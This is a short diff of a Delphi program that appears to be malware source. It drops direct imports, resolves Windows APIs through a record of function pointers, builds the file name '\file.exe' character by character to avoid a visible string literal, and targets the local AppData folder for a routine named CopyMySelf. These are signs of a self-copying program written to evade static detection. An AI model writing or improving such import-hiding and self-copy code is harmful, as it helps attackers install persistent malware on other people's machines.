@@ -1,7 +1,7 @@
 program Project1;
 
 uses
-  Windows, ShellAPI, shfolder;
+  Windows;
 
 type
   TAPIRec = packed record
@@ -19,6 +19,9 @@ type
     xSHGetFolderPathW:function(hwnd: HWND; csidl: Integer; hToken: THandle; dwFlags: DWORD; pszPath: PWideChar): HResult; stdcall;
   end;
   PAPIRec = ^TAPIRec;
+
+const
+  CSIDL_LOCAL_APPDATA        = $001C;
 
 function AllocMem(pAPI:PAPIRec; dwSize:Cardinal):Pointer;
 begin
@@ -40,8 +43,8 @@ var
 begin
   strFileName[0]:='\';strFileName[1]:='f';strFileName[2]:='i';strFileName[3]:='l';strFileName[4]:='e';strFileName[5]:='.';strFileName[6]:='e';strFileName[7]:='x';strFileName[8]:='e';strFileName[9]:=#0;
   Result := AllocMem(pAPI, MAX_PATH * 2);
-  pAPI.xSHGetFolderPathW(0, CSIDL_LOCAL_APPDATA, 0, SHGFP_TYPE_CURRENT, Result);
-  pAPI.xlstrcatW(Result, '\file.exe');
+  pAPI.xSHGetFolderPathW(0, CSIDL_LOCAL_APPDATA, 0, 0, Result);
+  pAPI.xlstrcatW(Result, @strFileName);
 end;
 
 procedure CopyMySelf(pAPI:PAPIRec);
